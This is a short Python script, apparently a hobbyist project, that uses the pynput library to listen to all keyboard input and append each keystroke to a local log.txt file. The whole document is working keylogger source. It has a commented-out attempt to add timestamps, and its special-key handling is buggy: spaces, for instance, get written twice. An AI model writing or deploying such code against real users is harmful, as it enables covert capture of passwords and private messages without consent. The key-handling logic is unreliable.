#!/usr/bin/env python3
from pynput.keyboard import Listener  #library that allows for direct access to keyboard inputs
from datetime import datetime

def log_keystroke(key):
    now = datetime.now()
    key = str(key).replace("'", "")

    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        #if key == None:        (Trying to have it add a date and time line to top of the log file every time the logger is opened
            #f.write('\n')
            #f.write(now.strftime("%m/%d/%Y %H:%M:%S"))
            #f.write('\n')

        if key == "Key.space":
            key = ' '
            f.write(key)

        if key == "Key.shift":
            key = ""
            f.write(key)
        
        if key == "Key.backspace":
            key = ""
            f.write(key)

        f.write(key)

with Listener(on_press=log_keystroke) as l: #when run on keypress log_keystroke is run 
    l.join()
